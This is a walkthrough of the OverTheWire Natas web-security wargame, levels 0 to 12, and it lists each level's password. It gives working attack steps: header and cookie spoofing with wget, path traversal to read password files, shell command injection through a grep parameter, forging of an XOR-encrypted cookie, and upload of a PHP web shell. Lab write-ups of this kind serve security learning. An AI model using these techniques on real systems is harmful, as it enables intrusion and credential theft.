# Natas walkthrough

### For serverside web security.

Initial: 

Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

# Level 0

URL: http://natas0.natas.labs.overthewire.org/

A simple view page source gave the password.

Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

# Level 1

URL: http://natas1.natas.labs.overthewire.org/

Even though rightclicking was blocked, F12 gave away the result.

Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# Level 2

## Hidden file directory

URL: http://natas2.natas.labs.overthewire.org/

There is nothing in the page, except one pixel wide image. Not of much interest. But the link of that image is `files/image.png`. Firing a URL to view this `files` directory comes up with more code, with somewhere a `users.txt`. The contents are as below.

```s
#### username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

# Level 3

## Of robots.txt

URL: http://natas3.natas.labs.overthewire.org/

Viewing the page source gave a hint: not even Google will find this time. What prevents Google from finding anything? robots.txt. Firing in `http://natas3.natas.labs.overthewire.org/robots.txt` gave the:

```s
User-agent: *
Disallow: /s3cr3t/
```
Firing `http://natas3.natas.labs.overthewire.org/robots.txts3cr3t/` gave the directory's index with a txt file.

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

# Level 4

## Changing source of HTTP request

URL: http://natas4.natas.labs.overthewire.org/

The page on being visited says something on the lines you are coming from xyz, access granted to only `http://natas5.natas.labs.overthewire.org/`.

Quite evidently, accessing this page as if it was being accessed from `http://natas5.natas.labs.overthewire.org/` does the trick. When thinking about such, refer to `HTTP headers`. The useful header to use is the `HTTP referer URL`, that spoofs the source to be something else.

Simply fire from terminal: 

```s
wget http://natas4.natas.labs.overthewire.org/ --http-user=natas4 --http-password=Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer=http://natas5.natas.labs.overthewire.org/
```

where `--http-user` and `--http-password` serve to authenticate the page. This downloads a file `index.html`. Open that and you shall get the password.

Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

#### (This level may also be solved using a Burp proxy).

# Level 5

## Changing login information (or manipulating cookies)

#### Cookies are small pieces of data stored by the web server on the user's computer that store stateful information as the login status, history, browsing activity, bookmarks, and so on. The most important feature is to store user's login information (recall Remember Me checkbox when signing in).


URL: http://natas5.natas.labs.overthewire.org/

The initial page says that access is denied since you are not logged in. So what stores information about the logged in status? Try seeing the server response:

```s
wget http://natas5.natas.labs.overthewire.org/ --user=natas5 --password=iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --server-response
``` 
The following information pops up.

```s
--2020-07-05 21:13:35--  http://natas5.natas.labs.overthewire.org/
Resolving natas5.natas.labs.overthewire.org (natas5.natas.labs.overthewire.org)... 176.9.9.172
Connecting to natas5.natas.labs.overthewire.org (natas5.natas.labs.overthewire.org)|176.9.9.172|:80... connected.
HTTP request sent, awaiting response... 
  HTTP/1.1 401 Unauthorized
  Date: Sun, 05 Jul 2020 15:41:36 GMT
  Server: Apache/2.4.10 (Debian)
  WWW-Authenticate: Basic realm="Authentication required"
  Content-Length: 480
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=iso-8859-1
Authentication selected: Basic realm="Authentication required"
Reusing existing connection to natas5.natas.labs.overthewire.org:80.
HTTP request sent, awaiting response... 
  HTTP/1.1 200 OK
  Date: Sun, 05 Jul 2020 15:41:36 GMT
  Server: Apache/2.4.10 (Debian)
  Set-Cookie: loggedin=0 ############################################ <-- THIS
  Vary: Accept-Encoding
  Content-Length: 855
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
Length: 855 [text/html]
Saving to: ‘index.html’

index.html             100%[=========================>]     855  --.-KB/s    in 0s      

2020-07-05 21:13:36 (50.0 MB/s) - ‘index.html’ saved [855/855]
```

Note a cookie storing information `Set-Cookie: loggedin=0`. We need to change this. 

```s
wget http://natas5.natas.labs.overthewire.org/ --user=natas5 --password=iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --server-response --header "Cookie: loggedin=1" 
```

This downloads a file named index.html.1. Open that to your delight.

Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# Level 6

## Forms

URL: http://natas6.natas.labs.overthewire.org/

The URL contains a form and a source-code of the form. Opening the source code gives that a variable `'secret'` contains the secret that goes past the form. There is no information of this secret, except the fact of some `include "includes/secret.inc"`. Open the URL `http://natas6.natas.labs.overthewire.org/includes/secret.inc` gives a blank page. Still, open the source code and a variable secret is there.

Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

# Level 7

## [Query String](https://en.wikipedia.org/wiki/Query_string)

#### A query string within a URL specifies values of parameters that manipulate search. Usually given after a ? towards the end of the URL.

URL: http://natas7.natas.labs.overthewire.org/

Upon opening the webpage, you will find the hint that the password is in /etc/natas_webpass/natas8 as well as the following `index.php?page=home` and `index.php?page=about`. Simply do a `index.php?page=/etc/natas_webpass/natas8` to open the hidden page with the password. In this example, the query parameter `page` needs to be set to the page being requested.

Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# Level 8

## Basic PHP scripting

URL: http://natas8.natas.labs.overthewire.org/

The following PHP function was guarding the access:

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

A simple reverse of the function does the trick.

```php
<?
function decode_secret($secret){
    return base64_decode(strrev(hex2bin($secret)))
}

echo decode_secret("3d3d516343746d4d6d6c315669563362");
?>
```

Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# Level 9

## Why passthru() is NOT secure?

#### passthru() is a PHP method allowing to execute commands. It is not considered secure anywhere.

URL: http://natas9.natas.labs.overthewire.org/

The code obtained:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The point is that `passthru` is not validating what is going within it. We abuse this by sending in:

```s
grep -i [A-Za-z0-9] * dictionary.txt
```

A more thoughtful search of the form:

```s
grep -i [A-Za-z0-9] /etc/natas_webpass_natas10 dictionary.txt
```

does the trick. It is also absused in the following way:

```s
grep -i ;ls -la; dictionary.txt
grep -i ;ps -el; dictionary.txt
```

Everything runs.

Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# Level 10

## passthru() is still not secure.

URL: http://natas10.natas.labs.overthewire.org/

This time the code is modified as:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Note the `/[;|&]/` regex that is filtered out. However, there is no restriction on using `[]`. Thus, we do 

```s
grep -i [A-Za-z0-9] /etc/natas_webpass/natas11 dictionary.txt
```

evades the filter.

Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

# Level 11

## Reverse engineering XOR cipher

#### Read more about XOR cipher [here](https://en.wikipedia.org/wiki/XOR_cipher). The thing to note is XOR ciphers are open to known-plaintext attacks. Thus, plaintext XOR ciphertext = key.

URL: http://natas11.natas.labs.overthewire.org/

Given the PHP code for XOR encryption:

```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

and the following series of steps:

```php
setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
```

The application tests is `show_password = yes` in `$d = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`.

Thus, using the plaintext attack, we first get the ciphertext from 

```s
wget http://natas11.natas.labs.overthewire.org/ --user=natas11 --password=U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --server-response
```
Ciphertext is the base 64 decoded version of the cookie value `Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D`.

Now writing a function:

```php
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

xor_encrypt(base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D'));
```

This gives the key as repetitions of `qw8J`. Have sufficient repetitions to make sure no out of bounds comes for `$key[$i % ...]`. Now update the function,

```php
function xor_encrypt($in) {
    $key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

new_cookie_value = base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))))

```

and finally call

```s
wget http://natas11.natas.labs.overthewire.org/ --user=natas11 --password=U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --server-response --header = new_cookie_value
```

Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

# Level 12 

## Intercepting and changing webpage logic

URL: http://natas12.natas.labs.overthewire.org/

The following code comes up.

```php
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

It may seem by `$ext = pathinfo($fn, PATHINFO_EXTENSION);` that any file of the name `*.jpg.php` will not only be uploaded but also be uploaded as a valid php file. However, notice that the statement responsible for calling the above statement is `$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);` which captures `$_POST["filename"]`. Now when we search for `filename`, we obtain the statement 

```php
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

which forces the filename to be a `jpg`. Evidently, any file of the form `*.jpg.php` gets uploaded as a random `jpg`. To overcome this, open `inspect element` and change this line to:

```php
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.php" />
```

Now create a file `index.jpg.php` with the following code:

```php
<html>
<head>
<title>Online PHP Script Execution</title>
</head>
<body>
<?php
  echo "Hello\n";
  echo passthru("cat /etc/natas_webpass/natas13");
  echo "\n";
?>
</body>
</html>
```

Upload the file. It will be uploaded as a valid php file and the link shall be given back to you. Visit the link to get the password.


Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

#### Alternatively, use Burp to intercept traffic and change this particular fact.

# Level 13

URL: http://natas13.natas.labs.overthewire.org/